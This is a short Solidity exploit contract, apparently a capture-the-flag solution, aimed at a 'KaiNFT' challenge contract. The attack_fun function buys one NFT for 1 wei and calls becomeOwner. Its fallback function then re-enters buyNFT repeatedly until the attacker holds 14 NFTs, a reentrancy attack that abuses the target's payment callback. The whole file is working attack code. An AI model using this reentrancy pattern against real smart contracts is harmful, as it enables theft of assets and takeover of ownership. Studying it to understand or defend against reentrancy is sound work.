pragma solidity ^0.8.13;

import "./contracts/Chal.sol";

contract attack
{
    KaiNFT target;

    constructor(address target_addr)
    {
        target = KaiNFT(target_addr);
    }

    function attack_fun() public payable
    {
        require(msg.value == 1);

        target.buyNFT{value: 1}();
        target.becomeOwner();
    }

    fallback() external payable
    {
        while (target.nfts_owned(address(this)) < 14)
        {
            target.buyNFT{value: 1}();
        }
    }
}